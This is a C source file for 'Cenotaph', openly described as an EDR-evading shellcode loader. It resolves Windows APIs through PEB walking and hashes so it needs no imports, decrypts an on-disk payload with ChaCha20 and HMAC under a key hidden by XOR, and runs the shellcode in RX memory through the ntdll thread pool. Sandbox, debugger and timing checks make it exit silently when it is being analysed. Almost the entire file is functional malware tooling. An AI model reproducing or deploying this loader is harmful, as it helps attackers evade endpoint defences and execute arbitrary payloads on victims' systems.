/*
 * Cenotaph — EDR-fit disk host / fallback shellcode loader.
 *
 * Hardened v2:
 *   * Zero IAT imports: every API is resolved at runtime via PEB + FNV1a.
 *   * Encrypted payload: <exe-stem>.dat is nonce(12) || ciphertext || hmac(32).
 *     Verified with HMAC-SHA256, decrypted with ChaCha20 IETF (counter 1).
 *   * Key embedded XOR-obfuscated (generated per-build by tools/encrypt.py).
 *   * RW -> RX allocation; never RWX.
 *   * Execution hand-off via ntdll thread pool (TppWorkerThread start address)
 *     with direct-call fallback.
 *   * Fail-closed anti-analysis: debugger, NtGlobalFlag, RDTSC timing,
 *     CPU count, uptime, heap debug flags.
 *
 * Build: see Makefile.  Generate the matching <exe-stem>.dat with
 * tools/encrypt.py before staging on target.
 */
#include "Cenotaph.h"
#include "Constexpr.h"
#include "CenKey.h"

/* ---- tunables ---- */
#ifndef CENOTAPH_SANDBOX_CHECK
#define CENOTAPH_SANDBOX_CHECK 1
#endif
#define CEN_MIN_CPUS        2        /* <2 => likely sandbox            */
#define CEN_MIN_UPTIME_MS   600000   /* <10 min since boot => sandbox   */
#define CEN_MAX_PAYLOAD     (8*1024*1024) /* 8 MB cap                  */
#define CEN_RDTSC_THRESHOLD 0x4000   /* single-step / hypervisor noise   */

CEN_INSTANCE g_Inst;

/* Stack-probe stub: gcc emits a ___chkstk_ms call for frames that touch a
 * page boundary; with -nostdlib there is no CRT to provide it. */
extern "C" void ___chkstk_ms( void ) { }

/* ------------------------------------------------------------------ *
 *  Tiny libc replacements (no CRT).
 * ------------------------------------------------------------------ */
static void CenMemSet( PVOID dst, UCHAR v, SIZE_T n ) {
    PUCHAR p = (PUCHAR)dst;
    while ( n-- ) *p++ = v;
}

static void CenMemCpy( PVOID dst, const void* src, SIZE_T n ) {
    PUCHAR d = (PUCHAR)dst;
    const UCHAR* s = (const UCHAR*)src;
    while ( n-- ) *d++ = *s++;
}

static int CenMemCmp( const void* a, const void* b, SIZE_T n ) {
    const UCHAR* x = (const UCHAR*)a;
    const UCHAR* y = (const UCHAR*)b;
    while ( n-- ) {
        if ( *x != *y ) return (int)*x - (int)*y;
        x++; y++;
    }
    return 0;
}

/* ------------------------------------------------------------------ *
 *  Crypto: ChaCha20 IETF + SHA-256 + HMAC-SHA256.
 * ------------------------------------------------------------------ */
static inline DWORD CenRol32( DWORD x, int n ) { return ( x << n ) | ( x >> ( 32 - n ) ); }
static inline DWORD CenRor32( DWORD x, int n ) { return ( x >> n ) | ( x << ( 32 - n ) ); }

static inline DWORD CenU8To32( const UCHAR* p ) {
    return (DWORD)p[0] | ( (DWORD)p[1] << 8 ) | ( (DWORD)p[2] << 16 ) | ( (DWORD)p[3] << 24 );
}

static inline void CenU32To8( UCHAR* p, DWORD v ) {
    p[0] = (UCHAR)v; p[1] = (UCHAR)( v >> 8 ); p[2] = (UCHAR)( v >> 16 ); p[3] = (UCHAR)( v >> 24 );
}

#define CEN_QR(a,b,c,d) \
    a += b; d ^= a; d = CenRol32(d, 16); \
    c += d; b ^= c; b = CenRol32(b, 12); \
    a += b; d ^= a; d = CenRol32(d,  8); \
    c += d; b ^= c; b = CenRol32(b,  7);

static void CenChaChaBlock( const UCHAR key[32], const UCHAR nonce[12], DWORD counter, UCHAR out[64] ) {
    DWORD x[16];
    const UCHAR* sigma = (const UCHAR*)"expand 32-byte k";
    x[0]  = CenU8To32(sigma + 0);  x[1]  = CenU8To32(sigma + 4);
    x[2]  = CenU8To32(sigma + 8);  x[3]  = CenU8To32(sigma + 12);
    x[4]  = CenU8To32(key + 0);   x[5]  = CenU8To32(key + 4);
    x[6]  = CenU8To32(key + 8);   x[7]  = CenU8To32(key + 12);
    x[8]  = CenU8To32(key + 16);  x[9]  = CenU8To32(key + 20);
    x[10] = CenU8To32(key + 24);  x[11] = CenU8To32(key + 28);
    x[12] = counter;
    x[13] = CenU8To32(nonce + 0);
    x[14] = CenU8To32(nonce + 4);
    x[15] = CenU8To32(nonce + 8);

    DWORD w[16];
    CenMemCpy( w, x, sizeof(w) );
    for ( int i = 0; i < 10; i++ ) {
        CEN_QR(w[0], w[4], w[ 8], w[12]); CEN_QR(w[1], w[5], w[ 9], w[13]);
        CEN_QR(w[2], w[6], w[10], w[14]); CEN_QR(w[3], w[7], w[11], w[15]);
        CEN_QR(w[0], w[5], w[10], w[15]); CEN_QR(w[1], w[6], w[11], w[12]);
        CEN_QR(w[2], w[7], w[ 8], w[13]); CEN_QR(w[3], w[4], w[ 9], w[14]);
    }
    for ( int i = 0; i < 16; i++ ) w[i] += x[i];
    for ( int i = 0; i < 16; i++ ) CenU32To8( out + 4 * i, w[i] );
}

static void CenChaChaCrypt( const UCHAR key[32], const UCHAR nonce[12], UCHAR* data, SIZE_T len, DWORD counter_start ) {
    UCHAR block[64];
    DWORD counter = counter_start;
    SIZE_T i = 0;
    while ( i < len ) {
        CenChaChaBlock( key, nonce, counter++, block );
        SIZE_T chunk = ( len - i < 64 ) ? ( len - i ) : 64;
        for ( SIZE_T j = 0; j < chunk; j++ ) data[i + j] ^= block[j];
        i += chunk;
    }
}

/* SHA-256 */
typedef struct _CEN_SHA256_CTX {
    DWORD state[8];
    UCHAR buf[64];
    DWORD len;
    DWORD tot_len;
} CEN_SHA256_CTX;

static const DWORD CenK256[64] = {
    0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,
    0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,
    0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,
    0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,
    0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,
    0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,
    0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,
    0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2
};

static inline DWORD CenShaCh(DWORD x, DWORD y, DWORD z){ return (x & y) ^ (~x & z); }
static inline DWORD CenShaMaj(DWORD x, DWORD y, DWORD z){ return (x & y) ^ (x & z) ^ (y & z); }
static inline DWORD CenShaEp0(DWORD x){ return CenRor32(x,2) ^ CenRor32(x,13) ^ CenRor32(x,22); }
static inline DWORD CenShaEp1(DWORD x){ return CenRor32(x,6) ^ CenRor32(x,11) ^ CenRor32(x,25); }
static inline DWORD CenShaSig0(DWORD x){ return CenRor32(x,7) ^ CenRor32(x,18) ^ (x >> 3); }
static inline DWORD CenShaSig1(DWORD x){ return CenRor32(x,17) ^ CenRor32(x,19) ^ (x >> 10); }

static void CenSha256Transform( CEN_SHA256_CTX* ctx, const UCHAR* data ) {
    DWORD a,b,c,d,e,f,g,h,t1,t2,m[64];
    for ( int i = 0; i < 16; i++ ) m[i] = CenU8To32( data + 4 * i );
    for ( int i = 16; i < 64; i++ ) m[i] = CenShaSig1(m[i-2]) + m[i-7] + CenShaSig0(m[i-15]) + m[i-16];
    a = ctx->state[0]; b = ctx->state[1]; c = ctx->state[2]; d = ctx->state[3];
    e = ctx->state[4]; f = ctx->state[5]; g = ctx->state[6]; h = ctx->state[7];
    for ( int i = 0; i < 64; i++ ) {
        t1 = h + CenShaEp1(e) + CenShaCh(e,f,g) + CenK256[i] + m[i];
        t2 = CenShaEp0(a) + CenShaMaj(a,b,c);
        h = g; g = f; f = e; e = d + t1; d = c; c = b; b = a; a = t1 + t2;
    }
    ctx->state[0] += a; ctx->state[1] += b; ctx->state[2] += c; ctx->state[3] += d;
    ctx->state[4] += e; ctx->state[5] += f; ctx->state[6] += g; ctx->state[7] += h;
}

static void CenSha256Init( CEN_SHA256_CTX* ctx ) {
    ctx->state[0] = 0x6a09e667; ctx->state[1] = 0xbb67ae85;
    ctx->state[2] = 0x3c6ef372; ctx->state[3] = 0xa54ff53a;
    ctx->state[4] = 0x510e527f; ctx->state[5] = 0x9b05688c;
    ctx->state[6] = 0x1f83d9ab; ctx->state[7] = 0x5be0cd19;
    ctx->len = 0; ctx->tot_len = 0;
}

static void CenSha256Update( CEN_SHA256_CTX* ctx, const UCHAR* data, DWORD len ) {
    for ( DWORD i = 0; i < len; i++ ) {
        ctx->buf[ctx->len++] = data[i];
        ctx->tot_len++;
        if ( ctx->len == 64 ) {
            CenSha256Transform( ctx, ctx->buf );
            ctx->len = 0;
        }
    }
}

static void CenSha256Final( CEN_SHA256_CTX* ctx, UCHAR hash[32] ) {
    DWORD tot_bits = ctx->tot_len * 8;
    UCHAR pad = 0x80;
    CenSha256Update( ctx, &pad, 1 );
    while ( ctx->len != 56 ) {
        pad = 0;
        CenSha256Update( ctx, &pad, 1 );
    }
    UCHAR len_buf[8];
    for ( int i = 0; i < 8; i++ ) len_buf[i] = (UCHAR)( tot_bits >> ( 56 - i * 8 ) );
    CenSha256Update( ctx, len_buf, 8 );
    for ( int i = 0; i < 8; i++ ) CenU32To8( hash + 4 * i, ctx->state[i] );
}

static void CenHmacSha256( const UCHAR* key, DWORD klen, const UCHAR* msg, DWORD mlen, UCHAR out[32] ) {
    UCHAR k[64], i_pad[64], o_pad[64];
    CEN_SHA256_CTX ctx;
    CenMemSet( k, 0, 64 );
    if ( klen > 64 ) {
        CenSha256Init( &ctx ); CenSha256Update( &ctx, key, klen ); CenSha256Final( &ctx, k );
    } else {
        CenMemCpy( k, key, klen );
    }
    for ( int i = 0; i < 64; i++ ) { i_pad[i] = k[i] ^ 0x36; o_pad[i] = k[i] ^ 0x5c; }
    CenSha256Init( &ctx ); CenSha256Update( &ctx, i_pad, 64 ); CenSha256Update( &ctx, msg, mlen ); CenSha256Final( &ctx, out );
    CenSha256Init( &ctx ); CenSha256Update( &ctx, o_pad, 64 ); CenSha256Update( &ctx, out, 32 ); CenSha256Final( &ctx, out );
}

/* ------------------------------------------------------------------ *
 *  Resolve every PEB-walked API into g_Inst.
 *  Returns 1 on success, 0 if a critical resolve failed.
 * ------------------------------------------------------------------ */
static int CenResolve( void ) {
    g_Inst.Mod.Ntdll    = LdrModulePeb( H_MODULE_NTDLL );
    g_Inst.Mod.Kernel32 = LdrModulePeb( H_MODULE_KERNEL32 );
    if ( ! g_Inst.Mod.Ntdll || ! g_Inst.Mod.Kernel32 )
        return 0;

    /* ntdll — own-wrapper syscalls (no indirect/direct syscall) */
    g_Inst.Api.NtAllocateVirtualMemory  = (PFN_NtAllocateVirtualMemory) LdrFunction( g_Inst.Mod.Ntdll, HASH_STR( "NtAllocateVirtualMemory"  ) );
    g_Inst.Api.NtProtectVirtualMemory   = (PFN_NtProtectVirtualMemory)  LdrFunction( g_Inst.Mod.Ntdll, HASH_STR( "NtProtectVirtualMemory"   ) );
    g_Inst.Api.NtQuerySystemInformation = (PFN_NtQuerySystemInformation)LdrFunction( g_Inst.Mod.Ntdll, HASH_STR( "NtQuerySystemInformation" ) );
    g_Inst.Api.NtClose                 = (PFN_NtClose)                LdrFunction( g_Inst.Mod.Ntdll, HASH_STR( "NtClose"                  ) );
    g_Inst.Api.NtDelayExecution        = (PFN_NtDelayExecution)       LdrFunction( g_Inst.Mod.Ntdll, HASH_STR( "NtDelayExecution"         ) );
    g_Inst.Api.TpAllocWork             = (PFN_TpAllocWork)            LdrFunction( g_Inst.Mod.Ntdll, HASH_STR( "TpAllocWork"              ) );
    g_Inst.Api.TpPostWork              = (PFN_TpPostWork)             LdrFunction( g_Inst.Mod.Ntdll, HASH_STR( "TpPostWork"               ) );
    g_Inst.Api.TpReleaseWork           = (PFN_TpReleaseWork)          LdrFunction( g_Inst.Mod.Ntdll, HASH_STR( "TpReleaseWork"            ) );

    /* kernel32 — PEB-walked file I/O + path (zero IAT imports) */
    g_Inst.Api.GetModuleFileNameW = (PFN_GetModuleFileNameW) LdrFunction( g_Inst.Mod.Kernel32, HASH_STR( "GetModuleFileNameW" ) );
    g_Inst.Api.CreateFileW        = (PFN_CreateFileW)        LdrFunction( g_Inst.Mod.Kernel32, HASH_STR( "CreateFileW"        ) );
    g_Inst.Api.ReadFile           = (PFN_ReadFile)           LdrFunction( g_Inst.Mod.Kernel32, HASH_STR( "ReadFile"           ) );
    g_Inst.Api.GetFileSize        = (PFN_GetFileSize)        LdrFunction( g_Inst.Mod.Kernel32, HASH_STR( "GetFileSize"        ) );

    if ( ! g_Inst.Api.NtAllocateVirtualMemory || ! g_Inst.Api.NtProtectVirtualMemory ||
         ! g_Inst.Api.NtQuerySystemInformation || ! g_Inst.Api.NtClose ||
         ! g_Inst.Api.NtDelayExecution ||
         ! g_Inst.Api.TpAllocWork || ! g_Inst.Api.TpPostWork || ! g_Inst.Api.TpReleaseWork ||
         ! g_Inst.Api.GetModuleFileNameW || ! g_Inst.Api.CreateFileW ||
         ! g_Inst.Api.ReadFile || ! g_Inst.Api.GetFileSize )
        return 0;
    return 1;
}

/* ------------------------------------------------------------------ *
 *  Anti-analysis — fail-closed, silent.
 * ------------------------------------------------------------------ */
static int CenSandboxOk( void ) {
#if CENOTAPH_SANDBOX_CHECK
    PCEN_PEB peb = CenPeb();

    /* 1) PEB debugger flag */
    if ( peb->BeingDebugged )
        return 0;

    /* 2) NtGlobalFlag heap/debug bits at PEB+0xBC */
    {
        PULONG ntGlobal = (PULONG)( (PUCHAR)peb + 0xBC );
        if ( ( *ntGlobal & 0x70 ) != 0 )
            return 0;
    }

    /* 3) ProcessHeap debug flags at +0x70 / +0x74 */
    if ( peb->ProcessHeap ) {
        PDWORD flags = (PDWORD)( (PUCHAR)peb->ProcessHeap + 0x70 );
        PDWORD force = (PDWORD)( (PUCHAR)peb->ProcessHeap + 0x74 );
        if ( ( *flags & 0x60 ) != 0 || *force != 0 )
            return 0;
    }

    /* 4) CPU count */
    {
        CEN_SYS_BASIC sb;
        CenMemSet( &sb, 0, sizeof(sb) );
        ULONG ret = 0;
        if ( ! NT_SUCCESS( g_Inst.Api.NtQuerySystemInformation( SystemBasicInformation, &sb, sizeof(sb), &ret ) ) )
            return 0;
        if ( sb.NumberOfProcessors < CEN_MIN_CPUS )
            return 0;
    }

    /* 5) Uptime (BootTime -> CurrentTime) */
    {
        CEN_TIMEOFDAY_INFO tod;
        CenMemSet( &tod, 0, sizeof(tod) );
        ULONG ret = 0;
        if ( ! NT_SUCCESS( g_Inst.Api.NtQuerySystemInformation( SystemTimeOfDayInformation, &tod, sizeof(tod), &ret ) ) )
            return 0;
        LONGLONG uptime_ms = ( tod.CurrentTime.QuadPart - tod.BootTime.QuadPart ) / 10000LL;
        if ( uptime_ms < (LONGLONG)CEN_MIN_UPTIME_MS )
            return 0;
    }

    /* 6) RDTSC timing check */
    {
        DWORD t0 = (DWORD)__rdtsc();
        DWORD t1 = (DWORD)__rdtsc();
        if ( ( t1 - t0 ) > CEN_RDTSC_THRESHOLD )
            return 0;
    }
#endif
    return 1;
}

/* ------------------------------------------------------------------ *
 *  Build the payload path: <exe-dir>\<exe-stem>.dat
 * ------------------------------------------------------------------ */
static int CenBuildPayloadPath( LPWSTR out, DWORD cap ) {
    WCHAR  exe[ 1024 ];
    DWORD  n = g_Inst.Api.GetModuleFileNameW( NULL, exe, 1024 );
    DWORD  i, sep = 0, dot = 0;

    if ( ! n || n >= 1024 )
        return 0;

    for ( i = 0; i < n && exe[i]; i++ ) {
        if ( exe[i] == L'\\' || exe[i] == L'/' ) { sep = i; dot = 0; }
        else if ( exe[i] == L'.' )               { dot = i; }
    }

    if ( ( sep + 1 ) + 64 > cap ) return 0;
    for ( i = 0; i <= sep; i++ ) out[i] = exe[i];

    DWORD stemStart = sep + 1;
    DWORD stemEnd   = ( dot > stemStart ) ? dot : n;
    DWORD o = sep + 1;
    for ( i = stemStart; i < stemEnd; i++ ) out[ o++ ] = exe[i];

    out[ o++ ] = L'.'; out[ o++ ] = L'd'; out[ o++ ] = L'a'; out[ o++ ] = L't';
    out[ o ] = L'\0';
    return 1;
}

/* ------------------------------------------------------------------ *
 *  Read the encrypted payload file into a fresh RW buffer.
 *  Returns buffer and file size (not page-aligned) via out params.
 *  Caller must free with NtFreeVirtualMemory.
 * ------------------------------------------------------------------ */
static PVOID CenReadPayload( LPCWSTR path, SIZE_T *pSize ) {
    HANDLE hFile = INVALID_HANDLE_VALUE;
    PVOID  buf   = NULL;
    SIZE_T alloc = 0;
    DWORD  fsz   = 0;
    DWORD  rd    = 0;

    hFile = g_Inst.Api.CreateFileW( path, GENERIC_READ, FILE_SHARE_READ,
                                    NULL, OPEN_EXISTING, 0, NULL );
    if ( hFile == INVALID_HANDLE_VALUE )
        return NULL;

    fsz = g_Inst.Api.GetFileSize( hFile, NULL );
    if ( ! fsz || fsz == INVALID_FILE_SIZE || fsz > CEN_MAX_PAYLOAD || fsz < 44 ) {
        g_Inst.Api.NtClose( hFile );
        return NULL;
    }

    alloc = ( (SIZE_T)fsz + 0xFFF ) & ~( (SIZE_T)0xFFF );
    {
        SIZE_T region = alloc;
        NTSTATUS st = g_Inst.Api.NtAllocateVirtualMemory( (HANDLE)(LONG_PTR)-1,
                            &buf, 0, &region, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
        if ( ! NT_SUCCESS( st ) || ! buf ) {
            g_Inst.Api.NtClose( hFile );
            return NULL;
        }
        alloc = region;
    }

    if ( ! g_Inst.Api.ReadFile( hFile, buf, fsz, &rd, NULL ) || rd != fsz ) {
        g_Inst.Api.NtClose( hFile );
        return NULL;
    }
    g_Inst.Api.NtClose( hFile );

    *pSize = fsz;
    return buf;
}

/* ------------------------------------------------------------------ *
 *  Deobfuscate the embedded key.
 * ------------------------------------------------------------------ */
static void CenGetKey( UCHAR key[32] ) {
    for ( int i = 0; i < 32; i++ )
        key[i] = EKEY[i] ^ CEN_OBF_BYTE;
}

/* ------------------------------------------------------------------ *
 *  Verify HMAC, decrypt, allocate RX, execute via thread pool.
 *  layout: nonce(12) || ciphertext(payload_len) || hmac(32)
 * ------------------------------------------------------------------ */
static void CenRunPayload( PVOID encBuf, SIZE_T encSize ) {
    UCHAR  key[32];
    UCHAR  hmac[32];
    SIZE_T payloadLen = encSize - 12 - 32;
    PUCHAR nonce = (PUCHAR)encBuf;
    PUCHAR cipher = nonce + 12;
    PUCHAR storedMac = cipher + payloadLen;
    PVOID  exec = NULL;
    SIZE_T execSz = 0;
    ULONG  oldProt = 0;
    PTP_WORK work = NULL;

    CenMemSet( key, 0, sizeof(key) );
    CenMemSet( hmac, 0, sizeof(hmac) );

    CenGetKey( key );

    /* Verify HMAC over nonce || ciphertext */
    CenHmacSha256( key, 32, nonce, (DWORD)( 12 + payloadLen ), hmac );
    if ( CenMemCmp( hmac, storedMac, 32 ) != 0 )
        goto done;

    /* Allocate RW buffer for plaintext, decrypt into it, flip RX. */
    execSz = ( payloadLen + 0xFFF ) & ~( (SIZE_T)0xFFF );
    {
        SIZE_T region = execSz;
        NTSTATUS st = g_Inst.Api.NtAllocateVirtualMemory( (HANDLE)(LONG_PTR)-1,
                            &exec, 0, &region, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
        if ( ! NT_SUCCESS( st ) || ! exec )
            goto done;
        execSz = region;
    }

    CenMemCpy( exec, cipher, payloadLen );
    CenChaChaCrypt( key, nonce, (PUCHAR)exec, payloadLen, 1 );

    {
        PVOID  base = exec;
        SIZE_T span = execSz;
        if ( ! NT_SUCCESS( g_Inst.Api.NtProtectVirtualMemory( (HANDLE)(LONG_PTR)-1,
                                &base, &span, PAGE_EXECUTE_READ, &oldProt ) ) )
            goto done;
    }

    /* Thread-pool hand-off (worker start = ntdll!TppWorkerThread) */
    if ( NT_SUCCESS( g_Inst.Api.TpAllocWork( &work, (PTP_WORK_CALLBACK)exec, NULL, NULL ) ) && work ) {
        g_Inst.Api.TpPostWork( work );
        g_Inst.Api.TpReleaseWork( work );
    } else {
        /* fallback: direct call on this thread */
        ( (VOID (*)(VOID)) exec )();
    }

    /* Keep main thread asleep while payload runs on the pool. */
    {
        LARGE_INTEGER forever;
        forever.QuadPart = 0x8000000000000000LL; /* INFINITE-ish */
        g_Inst.Api.NtDelayExecution( FALSE, &forever );
    }

done:
    CenMemSet( key, 0, sizeof(key) );
    CenMemSet( hmac, 0, sizeof(hmac) );
}

/* ------------------------------------------------------------------ *
 *  Entry point — called by ntdll RtlUserThreadStart (no CRT).
 *  Returning from here terminates the process cleanly (sandbox bail
 *  before any thread is spawned).
 * ------------------------------------------------------------------ */
extern "C" VOID CenotaphEntry( void ) {
    WCHAR    path[ 1100 ];
    SIZE_T   encSize = 0;
    PVOID    encBuf = NULL;

    if ( ! CenResolve() )
        return;

    if ( ! CenSandboxOk() )
        return;

    if ( ! CenBuildPayloadPath( path, 1100 ) )
        return;

    encBuf = CenReadPayload( path, &encSize );
    if ( ! encBuf )
        return;

    CenRunPayload( encBuf, encSize );

    /* If we reach here, free the encrypted buffer before exit. */
    {
        PVOID base = encBuf;
        SIZE_T sz = 0;
        g_Inst.Api.NtAllocateVirtualMemory( (HANDLE)(LONG_PTR)-1,
            &base, 0, &sz, MEM_RELEASE, 0 );
    }
}
